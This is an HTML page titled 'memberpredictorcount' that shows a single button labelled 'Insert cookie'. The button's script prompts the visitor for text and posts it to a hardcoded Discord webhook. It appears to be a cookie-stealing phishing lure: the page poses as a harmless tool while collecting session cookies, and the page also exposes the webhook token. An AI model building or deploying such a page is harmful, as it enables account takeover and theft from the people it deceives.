<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>memberpredictorcount</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #f0f0f0;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <button id="sendButton">>Insert cookie<</button>

    <script>
        document.getElementById('sendButton').addEventListener('click', function() {
            const message = prompt("Enter your message:");
            if (message) {
                const webhookURL = 'https://discord.com/api/webhooks/1270054713081200763/Etnw95IkGxVRCSCFABo9JcWZIypi_5ciQ5SxYu3VDE-5B_1cgUv_pO-_TnHt_JaNbpRd';
                const payload = {
                    content: message
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        alert('Message sent successfully!');
                    } else {
                        alert('Failed to send message.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred while sending the message.');
                });
            }
        });
    </script>
</body>
</html>
